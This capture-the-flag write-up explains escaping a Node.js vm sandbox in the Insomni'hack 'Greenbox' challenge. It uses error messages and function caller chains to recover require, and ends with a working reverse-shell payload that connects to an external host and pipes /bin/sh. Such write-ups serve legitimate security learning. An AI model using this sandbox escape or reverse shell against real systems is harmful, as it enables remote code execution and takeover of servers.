# Insomni'hack : Greenbox

#### Author: ammar2

**Description**:
> We're given a web page where we can enter javascript code which the servers executes in a "sandboxed" environment.

So the first really critical part is getting information out about our execution, if our code
runs perfectly fine we get a message saying **Your plant is working...**

Not terribly helpful. However, if your code throws an Error, you get the error message back like so:
**Error: Unexpected end of input**

Perfect, we can leverage this to leak out information about the execution environment.
We should first check out what variables we're provided in the environment. If we run

    throw new Error(Object.getOwnPropertyNames(this));

We get back

    decodeURIComponent,JSON,escape,Object,plant,undefined,Function,TypeError,Boolean,ReferenceError,RegExp,Math,RangeError,
    Number,Date,isFinite,parseFloat,NaN,encodeURIComponent,isNaN,environment,Error,eval,SyntaxError,encodeURI,Array,decodeURI,
    String,life,parseInt,EvalError,URIError,unescape,Infinity


The interesting, non standard JS variables are *plant*, *life* and *environment*.

I took a dump of the plant variable like so

  throw new Error(JSON.stringify(plant));


We get back

  json
    [{
        "name": "stem",
        "form": "|/||=",
        "children": ["one", "two"]
    }, {
        "name": "one",
        "form": "\\\\\\|\\/",
        "children": []
    }, {
        "name": "two",
        "form": "|",
        "children": []
    }]


We should likely also look at how we're being called so I also did

  throw new Error(new Error().stack);


This gives us

    Error: Error
        at undefined:1:17
        at Script.(anonymous function) [as runInNewContext] (vm.js:41:22)
        at Object.<anonymous> (/home/greenbox/vm.js:21:27)
        at Module._compile (module.js:456:26)
        at Object.Module._extensions..js (module.js:474:10)
        at Module.load (module.js:356:32)
        at Function.Module._load (module.js:312:12)
        at Function.Module.runMain (module.js:497:10)
        at startup (node.js:119:16)
        at node.js:902:3


This confirms our suspicion that we're being run under a nodejs sandbox, namely using the runInNewContext function.

Assuming the plant variable is used afterwards, we could potentially change it and have the outter non-sandboxed code call into
our code. Running under this assumption I went ahead and wrote out:


    plant = {
        get 0() {
            throw new Error(new Error().stack);
        }
    };


Ths works because in javascript, the following syntax is equivilant array[0]/array.0, and any time external code uses
array[0] it'll jump to our function, perfect!

and this gives us back

    Error: Error
        at Object.0 (undefined:38:25)
        at Object.stringify (native)
        at argvEncode (/home/greenbox/vm.js:10:39)
        at Object.<anonymous> (/home/greenbox/vm.js:30:17)
        at Module._compile (module.js:456:26)
        at Object.Module._extensions..js (module.js:474:10)
        at Module.load (module.js:356:32)
        at Function.Module._load (module.js:312:12)
        at Function.Module.runMain (module.js:497:10)
        at startup (node.js:119:16)


Unfortunately this route, while interesting, turned out to mostly be a dead end. Namely the problem is, when being
called from outside the sandbox code, our object is only being JSON.stringified meaning we have no real access
to the node context.

## The real solution

After an hour of experiemntation with the earlier method, I looked into how we could use the stack in more interesting ways.
This lead me to learn that in javascript, functions have a non standard parameter called caller, which is the calling function,
now it was trivial to access the `Object.<anonymous> (/home/greenbox/vm.js:21:27)` which was calling us.


    function pewpew() {
        throw new Error(pewpew.caller.caller);
    }
    pewpew();


This gives us the source code for the anonymous function in vm.js calling the sandbox code


    Error: function (exports, require, module, __filename, __dirname) { var vm = require('vm');
    // A f*cking security researcher hacked us using process.mainModule to escape the vm.
    process.mainModule = {};

    function argvDecode(arg){
        return JSON.parse(new Buffer(arg, 'base64').toString('binary'));
    }

    function argvEncode(arg){
        return new Buffer(new Buffer(JSON.stringify(arg)).toString('binary')).toString('base64');
    }

    try{
        var environment = argvDecode(process.argv[2]);
        var life = argvDecode(process.argv[3]);
        var plant = argvDecode(process.argv[4]);
        var script = argvDecode(process.argv[5]);

        var sandbox = vm.createContext({environment: environment, life: life, plant: plant});
        var myScript = vm.createScript(script);
        var result = myScript.runInNewContext(sandbox, {timeout: 5000});
    }
    catch(err){
        var result = {
            error: err.message
        };
    }

    try{
        console.log(argvEncode(result));
    }
    catch(err){
        var result = {
            error: err.message
        };
        console.log(argvEncode(result));
    }

    }


Interestingly we can see that nodejs's require function is being passed as an argument to the calling function. In javascript
we can also access another function's passed arguments using f.arguments, this trivially allows us to execute whatever
code we want.

The final payload to make a reverse shell turned out to be

    function pewpew() {
        var func = arguments.callee.caller.caller.arguments;

        var require = func[1];

        var net = require('net');
        var spawn = require('child_process').spawn;

        HOST="ec2.ammaraskar.com";
        PORT="3333";
        TIMEOUT="5000";

        function c(HOST,PORT) {
            var client = new net.Socket();
            client.connect(PORT, HOST, function() {
                var sh = spawn('/bin/sh',[]);
                client.write("Connected\r\n");
                client.pipe(sh.stdin);
                sh.stdout.pipe(client);
            });
            client.on('error', function(e) {
                setTimeout(c(HOST,PORT), TIMEOUT);
            });
        }

        c(HOST,PORT);
    }

    pewpew();
